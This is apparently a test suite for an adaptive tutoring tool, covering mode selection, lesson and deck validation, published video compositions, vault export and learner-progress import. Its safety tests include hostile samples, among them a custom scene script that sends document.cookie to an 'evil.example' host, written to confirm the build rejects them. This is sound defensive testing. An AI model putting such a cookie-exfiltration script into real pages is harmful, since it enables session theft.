// Adaptive explainer videos and interactive video learning: the mode selector,
// the four representative experiences (HTTP request lifecycle → explainer,
// binary search → interactive lesson, Raft consensus → hybrid lab, marketing
// funnel strategy → branching deck), their gates, the published compositions,
// the vault export, caching, safety checks and the learner-progress loop.

import assert from 'node:assert/strict';
import fs from 'node:fs';
import path from 'node:path';
import { describe, test } from 'node:test';
import { EXPERIENCE_BUDGET, experienceBudget, resolveExperience, selectExperienceMode, signalProblems } from '../lib/experience-mode.mjs';
import { compositionSafetyProblems, CSP } from '../lib/composition-safety.mjs';
import { deckLayout, deckSpecProblems, hotspotRegion } from '../lib/deck.mjs';
import { experienceSpecProblems, experienceTabs, masteryOf } from '../lib/experience.mjs';
import { makeRoot, read, readTopic, removeRoot, TODAY, tutor, tutorJson, write } from './support/helpers.mjs';
import { buildCase, CASES, EXAMPLES, fixtureRoot, json, lessonPage, STATIC } from './support/experience-fixtures.mjs';

// --- selector ------------------------------------------------------------------------

describe('adaptive experience-mode selector', () => {
  test('routes the four representative topics to their modes', () => {
    for (const c of CASES) {
      const { signals, expected } = json(path.join(EXAMPLES, c.key, 'signals.json'));
      assert.deepEqual(signalProblems(signals), []);
      const result = selectExperienceMode(signals);
      assert.equal(result.mode, expected, `${c.key}: ${result.reasons.join('; ')}`);
      assert.equal(result.mode, c.expected);
      assert.ok(result.reasons.length >= 1);
    }
  });

  test('a simple idea stays static; low benefit and high mastery lighten the mode; low mastery adds practice', () => {
    assert.equal(selectExperienceMode(STATIC).mode, 'static');
    const consensus = json(path.join(EXAMPLES, 'distributed-consensus', 'signals.json')).signals;
    assert.equal(selectExperienceMode({ ...consensus, benefit: 'low' }).mode, 'explainer');
    const known = selectExperienceMode(consensus, { mastery: 0.9 });
    assert.equal(known.mode, 'interactive');
    assert.match(known.reasons.join(' '), /mastery 0.90 is high/);
    assert.equal(selectExperienceMode({ ...consensus, mastery: 0.9 }).mode, 'interactive', 'signals.mastery wins');
    const http = json(path.join(EXAMPLES, 'http-request-lifecycle', 'signals.json')).signals;
    assert.equal(selectExperienceMode({ ...http, parameters: 1, complexity: 2 }, { mastery: 0.2 }).mode, 'interactive');
    assert.equal(selectExperienceMode(http, { mastery: 0.95 }).mode, 'static');
  });

  test('overrides need a reason; interactive modes need an id; explainers need a video; budget per depth', () => {
    const binary = json(path.join(EXAMPLES, 'binary-search', 'signals.json')).signals;
    const page = { order: 2, experience: { signals: binary, mode: 'hybrid' } };
    const r = resolveExperience(page);
    assert.match(r.problems.join('\n'), /the selector chose interactive.*override_reason/);
    assert.match(r.problems.join('\n'), /needs `experience.id`/);
    const ok = resolveExperience({ order: 2, experience: { signals: binary, mode: 'explainer', override_reason: 'The learner asked for a short passive overview first.' }, video: { id: 'v', reason: 'x' } });
    assert.deepEqual(ok.problems, []);
    assert.equal(ok.mode, 'explainer');
    assert.match(resolveExperience({ experience: { signals: json(path.join(EXAMPLES, 'http-request-lifecycle', 'signals.json')).signals } }).problems.join(), /needs the page's `video`/);
    assert.match(signalProblems({ complexity: 9 }).join('\n'), /complexity/);
    const consensus = json(path.join(EXAMPLES, 'distributed-consensus', 'signals.json')).signals;
    const outline = [{ page: 'a', experience: { signals: consensus, id: 'lab' } }, { page: 'b', experience: { signals: binary, id: 'b' } }];
    assert.equal(experienceBudget(outline, 'quick').over, true);
    assert.equal(experienceBudget(outline, 'standard').total, 9);
    assert.equal(experienceBudget(outline, 'standard').budget, EXPERIENCE_BUDGET.standard);
  });

  test('the CLI explains its choice', () => {
    const root = makeRoot();
    try {
      const r = tutorJson(root, ['experience', 'select', '--file', path.join(EXAMPLES, 'distributed-consensus', 'signals.json')]);
      assert.equal(r.code, 0);
      assert.equal(r.data.mode, 'hybrid');
    } finally {
      removeRoot(root);
    }
  });
});

// --- spec checks -------------------------------------------------------------------------

describe('experience, deck and composition contracts', () => {
  test('every example experience and deck is valid; tabs follow the mode', () => {
    const tabs = { 'http-request-lifecycle': ['watch', 'practice'], 'binary-search': ['explore', 'guided', 'practice'], 'distributed-consensus': ['watch', 'explore', 'guided', 'deepdive', 'practice'], 'marketing-funnel-strategy': ['deepdive', 'practice'] };
    for (const c of CASES) {
      const spec = json(path.join(EXAMPLES, c.key, 'experience.json'));
      assert.deepEqual(experienceSpecProblems(spec), [], c.key);
      assert.equal(spec.mode, c.expected);
      assert.deepEqual(experienceTabs(spec), tabs[c.key]);
      const decks = path.join(EXAMPLES, c.key, 'decks');
      for (const f of fs.existsSync(decks) ? fs.readdirSync(decks) : []) assert.deepEqual(deckSpecProblems(json(path.join(decks, f))), { problems: [], warnings: [] }, f);
    }
  });

  test('experience problems: checkpoint limits, choices, misconceptions, experiment paths, references', () => {
    const http = json(path.join(EXAMPLES, 'http-request-lifecycle', 'experience.json'));
    const extra = { ...http.checkpoints[0], id: 'second', at: { tab: 'practice' } };
    assert.match(experienceSpecProblems({ ...http, checkpoints: [...http.checkpoints, extra] }).join('\n'), /explainer experience holds 0–1 checkpoints.*do not interrupt/);
    const binary = json(path.join(EXAMPLES, 'binary-search', 'experience.json'));
    const broken = structuredClone(binary);
    broken.checkpoints[0].choices[1].misconception = '';
    broken.checkpoints[0].choices[0].correct = false;
    broken.checkpoints[2].goal.condition = { path: 'nonsense', op: 'eq', value: 1 };
    broken.checkpoints[1].at = { scene: 'trace' };
    const text = experienceSpecProblems(broken, { scenes: new Set(['intro', 'idea', 'formula', 'trace', 'growth']) }).join('\n');
    assert.match(text, /exactly one choice/);
    assert.match(text, /needs a `misconception`/);
    assert.match(text, /condition path "nonsense" is not in the AlgorithmStepper state/);
    assert.match(text, /two checkpoints interrupt the same moment/);
    assert.match(text, /names scene "requirements", which the guided video does not have/);
    const noFallback = { ...binary, fallback_visual: undefined };
    assert.match(experienceSpecProblems(noFallback).join('\n'), /needs `fallback_visual`/);
    const hybrid = json(path.join(EXAMPLES, 'distributed-consensus', 'experience.json'));
    assert.match(experienceSpecProblems({ ...hybrid, summary_video: undefined, checkpoints: hybrid.checkpoints.filter((c) => c.kind !== 'experiment') }).join('\n'), /needs `summary_video`[\s\S]*experiment/);
  });

  test('deck layout: fragments sit inside their slide, hotspots stay clear of the nav capsule, branches are listed', () => {
    const deck = json(path.join(EXAMPLES, 'distributed-consensus', 'decks', 'consensus-tradeoffs.json'));
    const layout = deckLayout(deck);
    for (const scene of layout.scenes) for (const t of scene.fragmentTimes) assert.ok(t > scene.start && t < scene.start + scene.duration);
    assert.equal(layout.island.slides.length, 4);
    assert.deepEqual(layout.island.slideSequences.map((s) => s.id), ['split-brain', 'cluster-sizes']);
    assert.ok(layout.island.slides.every((s) => !layout.island.slideSequences.some((q) => q.slides.some((b) => b.sceneId === s.sceneId))), 'branch slides are not on the main path');
    for (let n = 1; n <= 3; n++) for (let i = 0; i < n; i++) {
      const r = hotspotRegion(i, n);
      assert.ok(r.x + r.w <= 70 && r.y + r.h <= 95, 'bottom-right nav capsule zone stays clear');
    }
    const bad = structuredClone(deck);
    bad.slides[2].hotspots[0].target = 'nowhere';
    bad.sequences[1].slides[0].hotspots = [{ label: 'Go deeper', target: 'split-brain' }];
    const text = deckSpecProblems(bad).problems.join('\n');
    assert.match(text, /targets "nowhere"/);
    assert.match(text, /never opened by a hotspot/);
    assert.match(text, /cannot open another branch/);
  });

  test('composition safety rejects network, storage, parent access, eval, timers and external assets', () => {
    for (const [code, what] of [
      ['fetch("/x")', /fetch/], ['new XMLHttpRequest()', /XMLHttpRequest/], ['localStorage.x = 1', /storage/],
      ['parent.document.body', /parent page/], ['eval("1")', /eval/], ['Math.random()', /randomness/],
      ['<img src="https://evil.example/x.png">', /external resource/], ['<div onclick="x()">', /inline event/],
      ['<script src="https://cdn.example/x.js"></script>', /loads a script/], ['<iframe src="a.html">', /embedded frames/],
    ]) assert.match(compositionSafetyProblems(code).join('\n'), what, code);
    assert.deepEqual(compositionSafetyProblems('<script src="https://cdn.jsdelivr.net/npm/gsap@3.15.0/dist/gsap.min.js"></script><script>parent.postMessage({a:1}, "*")</script>'), []);
    assert.match(CSP, /connect-src 'none'/);
  });
});

// --- four topics end to end ---------------------------------------------------------------

describe('four representative experiences end to end', () => {
  for (const c of CASES) {
    test(`${c.key}: ${c.expected} is selected, built, published, gated and exported`, () => {
      const root = fixtureRoot();
      try {
        const { id, p, page, spec, planned } = buildCase(root, c);
        assert.equal(planned.data.intake_gate.ok, true, JSON.stringify(planned.data.intake_gate));
        const plan = tutorJson(root, ['experience', id, 'plan']);
        assert.equal(plan.data.pages.find((x) => x.order === 2).mode, c.expected);
        assert.equal(plan.data.over, false);

        const built = tutorJson(root, ['experience', id, 'build', spec.id, '--skip-lint']);
        assert.equal(built.code, 0, JSON.stringify(built.data));
        assert.equal(built.data.mode, c.expected);
        const config = JSON.parse(read(root, `${p.experiences_dir}/${spec.id}/experience.built.json`));
        assert.equal(config.page_url, `${p.site_url}lesson/02-the-mechanism/`);
        assert.deepEqual(config.tabs, experienceTabs(spec));
        assert.equal(config.sources[0].id, `${c.slug}-source`);

        // Every part a tab needs is resolved to a published, offline, sandbox-safe file.
        for (const part of [config.watch, config.guided, config.summary_video].filter(Boolean)) {
          assert.match(part.composition_url, /^\/media\/.+\/composition\/index\.html$/);
          const html = read(root, `site/public${part.composition_url}`);
          assert.match(html, new RegExp(`Content-Security-Policy" content="${CSP.replace(/[.*+?^${}()|[\]\\]/g, '\\$&')}"`));
          assert.match(html, /src="(\.\.\/)+_hf\/hyperframe\.runtime\.iife\.js"/);
          assert.doesNotMatch(html, /cdn\.jsdelivr|assets\/fonts\//, 'GSAP and fonts are local');
          assert.deepEqual(compositionSafetyProblems(html, { allowGsapCdn: false }), []);
          assert.ok(part.scenes.length >= 3 && part.transcript.length > 50);
        }
        assert.ok(fs.existsSync(path.join(root, 'site/public/media/_hf/gsap.min.js')));
        assert.ok(fs.existsSync(path.join(root, 'site/public/media/_hf/hyperframe.runtime.iife.js')));
        if (config.deck) {
          const html = read(root, `site/public${config.deck.composition_url}`);
          assert.match(html, /application\/hyperframes-slideshow\+json/);
          for (const scene of config.deck.scenes) assert.match(html, new RegExp(`data-composition-id="${scene.id}"`));
          assert.match(html, /source: "hf-preview", type: "timeline"/);
          assert.match(html, /window\.__timelines\["main"\]/);
          assert.match(html, /data-composition-id="main"/);
          assert.ok(config.deck.island.slideSequences.length >= 1);
          assert.match(config.deck.outline, /## Deep dive:/);
          assert.ok(fs.existsSync(path.join(root, p.videos_dir, config.deck.deck_id, 'index.html')), 'the project opens as a working deck');
        }
        if (config.simulation) {
          for (const s of config.sync) assert.ok(config.guided.scenes.some((x) => x.id === s.scene));
        }
        for (const cp of config.checkpoints) {
          if (cp.at.scene) assert.ok(config.guided.scenes.some((x) => x.id === cp.at.scene));
          if (cp.at.slide) assert.ok(config.deck.scenes.some((x) => x.id === cp.at.slide));
        }

        // The lesson gate accepts the page and its experience.
        const lesson = tutorJson(root, ['validate', id, 'lesson', '--structure-only']);
        assert.equal(lesson.code, 0, JSON.stringify(lesson.data.failures, null, 1));

        // Cache: an unchanged build rewrites nothing; a re-verified source changes the hash.
        const again = tutorJson(root, ['experience', id, 'build', spec.id, '--skip-lint']);
        assert.equal(again.data.cached, true);
        assert.equal(tutorJson(root, ['experience', id, 'check', spec.id]).code, 0);

        // Obsidian: the experience note links its parts, checkpoints and lesson URL.
        assert.equal(tutor(root, ['map', id]).code, 0);
        const note = read(root, `${p.visuals_dir}/visual-${spec.id}-${c.slug}.md`);
        assert.match(note, new RegExp(`lesson/02-the-mechanism/`));
        assert.match(note, /## Checkpoints/);
        assert.match(note, /experience\.json/);
        assert.match(note, /## Sources[\s\S]*-source/);
        assert.match(note, /## My insights/);
        if (config.deck) {
          const deckNote = read(root, `${p.visuals_dir}/visual-${config.deck.deck_id}-${c.slug}.md`);
          assert.match(deckNote, /## Outline/);
          assert.match(deckNote, /hyperframes@0\.9\.59 present/);
          assert.match(note, new RegExp(`\\[\\[visual-${config.deck.deck_id}-${c.slug}\\|`));
        }
        const index = read(root, p.visuals_index);
        assert.match(index, /## Interactive experiences/);

        // Learner insights survive a re-export byte for byte.
        const insight = '\n- My own note about this experience.\n';
        fs.appendFileSync(path.join(root, `${p.visuals_dir}/visual-${spec.id}-${c.slug}.md`), insight);
        assert.equal(tutor(root, ['map', id]).code, 0);
        assert.ok(read(root, `${p.visuals_dir}/visual-${spec.id}-${c.slug}.md`).endsWith(insight));
      } finally {
        removeRoot(root);
      }
    });
  }

  test('gates: a quick hybrid is over budget; a missing or wrong-mode experience fails the lesson', () => {
    const root = fixtureRoot();
    try {
      const consensus = CASES.find((c) => c.key === 'distributed-consensus');
      const quick = buildCase(root, { ...consensus, slug: 'consensus-quick', title: 'Consensus Quick' }, { depth: 'quick' });
      assert.equal(quick.planned.data.intake_gate.ok, false);
      assert.match(JSON.stringify(quick.planned.data.intake_gate), /cost 6, depth \\"quick\\" allows 4/);

      const binary = CASES.find((c) => c.key === 'binary-search');
      const { id, p, page, spec } = buildCase(root, binary);
      const lesson = () => tutorJson(root, ['validate', id, 'lesson', '--structure-only']).data.failures.map((f) => f.problem).join('\n');
      assert.match(lesson(), /planned interactive experience "binary-search-lab" is not built/);
      assert.equal(tutorJson(root, ['experience', id, 'build', spec.id, '--skip-lint']).code, 0);
      write(root, page, lessonPage(2, '<Video id="binary-search-walkthrough" />'));
      assert.match(lesson(), /does not embed its planned interactive experience/);
      write(root, page, lessonPage(2, `<Experience id="${spec.id}" />`));
      write(root, `${p.experiences_dir}/${spec.id}/experience.json`, JSON.stringify({ ...spec, title: 'Changed title for the lab' }));
      assert.match(lesson(), /experience.json changed after the last build/);
    } finally {
      removeRoot(root);
    }
  });

  test('build rejects unsafe custom scenes and a non-static fallback; a re-verified source rebuilds', () => {
    const root = fixtureRoot();
    try {
      const binary = CASES.find((c) => c.key === 'binary-search');
      const { id, p, spec } = buildCase(root, binary);
      const first = tutorJson(root, ['experience', id, 'build', spec.id, '--skip-lint']);
      assert.equal(first.code, 0);
      const hash = JSON.parse(read(root, `${p.experiences_dir}/${spec.id}/experience.built.json`)).input_hash;
      write(root, 'tmp/patch.json', JSON.stringify({ title: 'Corrected source title after re-verification' }));
      assert.equal(tutorJson(root, ['sources', id, 'update', `${binary.slug}-source`, '--file', path.join(root, 'tmp/patch.json')]).code, 0);
      const rebuilt = tutorJson(root, ['experience', id, 'build', spec.id, '--skip-lint']);
      assert.equal(rebuilt.data.cached, false);
      assert.notEqual(JSON.parse(read(root, `${p.experiences_dir}/${spec.id}/experience.built.json`)).input_hash, hash);

      const video = JSON.parse(read(root, `${p.videos_dir}/binary-search-walkthrough/video.json`));
      video.scenes[1].visual = { type: 'custom', html: 'scenes/evil.html', labels: ['Look at the middle element'] };
      write(root, `${p.videos_dir}/binary-search-walkthrough/scenes/evil.html`, '<div>Look at the middle element</div><script>fetch("https://evil.example/" + document.cookie)</script>');
      write(root, `${p.videos_dir}/binary-search-walkthrough/video.json`, JSON.stringify(video));
      const unsafe = tutorJson(root, ['experience', id, 'build', spec.id, '--skip-lint']);
      assert.equal(unsafe.code, 1);
      assert.match(JSON.stringify(unsafe.data.problems), /network access with fetch\(\)[\s\S]*cookies/);

      write(root, `${p.experiences_dir}/${spec.id}/experience.json`, JSON.stringify({ ...spec, fallback_visual: spec.id }));
      video.scenes[1].visual = json(path.join(EXAMPLES, 'binary-search', 'videos', 'binary-search-walkthrough.json')).scenes[1].visual;
      write(root, `${p.videos_dir}/binary-search-walkthrough/video.json`, JSON.stringify(video));
      assert.match(JSON.stringify(tutorJson(root, ['experience', id, 'build', spec.id, '--skip-lint']).data.problems), /must be a static mermaid, svg or image visual/);
    } finally {
      removeRoot(root);
    }
  });
});

// --- learner progress ----------------------------------------------------------------------

describe('checkpoint results feed assessment and the selector', () => {
  test('import records mastery and misconceptions once, makes related recall cards due, and the plan proposes the recorded mastery', () => {
    const root = fixtureRoot();
    try {
      const consensus = CASES.find((c) => c.key === 'distributed-consensus');
      const { id, p, spec } = buildCase(root, consensus);
      assert.equal(tutorJson(root, ['experience', id, 'build', spec.id, '--skip-lint']).code, 0);
      // A curriculum concept title lets recall cards be matched to the concept.
      const topic = readTopic(root, id);
      write(root, 'tmp/plan2.json', JSON.stringify({ ...topic.plan, curriculum: { concepts: [{ id: 'leader-election', title: 'Leader election', disposition: 'included' }] } }));
      tutor(root, ['plan', id, '--set', path.join(root, 'tmp/plan2.json')]);
      write(root, p.recall, ['---', 'title: Recall', `topic: ${id}`, 'stage: notes', 'tags: [a, b]', `created: ${TODAY}`, '---', '', '<!-- card: dc-01 -->', 'What does leader election need?', '?', 'Votes from a majority.', '', '<!-- card: dc-02 -->', 'What is a log entry?', '?', 'A command.', '', '## My insights', ''].join('\n'));
      assert.equal(tutor(root, ['recall', 'sync', id]).code, 0, 'cards registered');
      for (const card of ['dc-01', 'dc-02']) tutor(root, ['recall', 'grade', id, card, 'easy']);
      const before = readTopic(root, id).recall.cards;
      assert.ok(before['dc-01'].due > TODAY);

      const exported = {
        format: 'tutor-progress', v: 1, topic: id, exported_at: '2026-11-14T12:00:00Z',
        experiences: { [spec.id]: { tab: 'guided', checkpoints: {
          'after-crash': { status: 'wrong', history: [{ at: '2026-11-14T11:00:00Z', status: 'wrong', misconception: 'Thinks Raft elects by server id instead of by votes after a random timeout' }, { at: '2026-11-14T11:01:00Z', status: 'wrong', misconception: 'Thinks followers can commit without a leader' }] },
          'four-servers': { status: 'wrong', history: [{ at: '2026-11-14T11:05:00Z', status: 'wrong', misconception: 'Thinks half the servers is a majority' }] },
          'stop-progress': { status: 'correct', history: [{ at: '2026-11-14T11:10:00Z', status: 'correct' }] },
        } } },
      };
      write(root, 'tmp/progress.json', JSON.stringify(exported));
      const imported = tutorJson(root, ['experience', id, 'progress', '--file', path.join(root, 'tmp/progress.json')]);
      assert.equal(imported.code, 0, JSON.stringify(imported.data));
      const weak = imported.data.weak.find((w) => w.id === 'leader-election');
      assert.ok(weak && weak.mastery < 0.6);
      assert.equal(weak.misconceptions.length, 3);
      assert.deepEqual(weak.revisit, [{ experience: spec.id, scene: 'heartbeats' }]);
      assert.deepEqual(imported.data.cards_due_now, ['dc-01']);
      assert.equal(readTopic(root, id).recall.cards['dc-01'].due, TODAY);

      // Importing the same export again changes nothing.
      const progress = JSON.parse(read(root, p.progress_json));
      tutorJson(root, ['experience', id, 'progress', '--file', path.join(root, 'tmp/progress.json')]);
      assert.deepEqual(JSON.parse(read(root, p.progress_json)).concepts, progress.concepts);
      assert.equal(masteryOf({ correct: 3, wrong: 0 }), 0.8);

      // `experience plan` reads recorded mastery and proposes it for the signals.
      const planned = tutorJson(root, ['experience', id, 'plan']);
      assert.equal(planned.code, 0);
      const main = planned.data.pages.find((x) => x.order === 2);
      assert.equal(main.recorded_mastery, 0.33);
      assert.equal(main.mode, 'hybrid', 'low mastery keeps the full lab');
    } finally {
      removeRoot(root);
    }
  });
});
